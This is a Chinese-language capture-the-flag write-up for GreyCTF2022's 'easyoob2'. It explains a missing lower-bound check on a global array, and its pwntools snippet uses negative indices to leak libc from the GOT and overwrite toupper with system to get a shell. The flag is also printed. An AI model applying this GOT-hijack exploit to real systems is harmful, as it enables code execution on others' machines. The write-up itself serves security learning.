# GreyCTF2022 - easyoob2

## 题目简述

第二版把排行榜移到全局区，挡住了直接覆盖栈返回地址，但索引检查仍遗漏负数。负下标可访问排行榜之前的 GOT，既能泄露 libc，也能改写后续必经的库函数调用。

## 解题过程

由 `leaderboard` 与 GOT 项地址之差计算负索引。先读取一个已解析函数的 GOT 值并减去其 libc 符号偏移，得到 libc 基址；再把 `toupper@GOT` 覆盖为 `system`。

```python
elf = ELF('./easyoob2', checksec=False)
libc = ELF('./libc.so.6', checksec=False)

idx_puts = (elf.got['puts'] - elf.sym['leaderboard']) // 8
leak = read_entry(idx_puts)
libc.address = leak - libc.sym['puts']

idx_toupper = (elf.got['toupper'] - elf.sym['leaderboard']) // 8
write_entry(idx_toupper, libc.sym['system'])
```

程序的“转大写”路径会逐项调用 `toupper`。输入 `sh;` 后，第一次间接调用实际成为 `system("sh;")`，拿到 shell 并读取：

```text
grey{0k_n0t_b4d_t1m3_t0_try_th3_h4rd3r_0n3s}
```

## 方法总结

边界检查必须同时限制下界和上界。全局数组的负索引常能触及 GOT、其他全局指针或函数表；利用时应选一个调用参数本身可被解释为命令字符串、且覆盖后仍会被稳定触发的 GOT 项。
